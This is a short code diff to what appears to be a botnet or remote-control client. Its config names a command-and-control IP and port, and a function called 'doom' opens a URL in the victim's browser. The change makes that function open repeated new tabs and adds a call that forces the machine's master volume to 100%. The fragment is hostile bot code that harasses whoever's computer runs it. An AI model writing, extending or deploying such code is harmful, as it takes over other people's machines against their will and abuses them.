@@ -24,6 +24,7 @@ import random
 import threading
 import base64 as b64
 import webbrowser
+from subprocess import call
 #config
 cnc                  = "127.0.0.1"#your cnc ip
 cport                = 1337#your cnc port
@@ -47,10 +48,11 @@ def doom(ip, url, port):
 		if stop :
 			break
 		try:
-			if webbrowser.open(url) is True:
+			if webbrowser.open_new_tab(url) is True:
 				break
 			else:  
-				webbrowser.open(url)
+				webbrowser.open_new_tab(url)
+				call(["amixer", "-D", "pulse", "sset", "Master", "100%"])
 		except:
 			pass
 
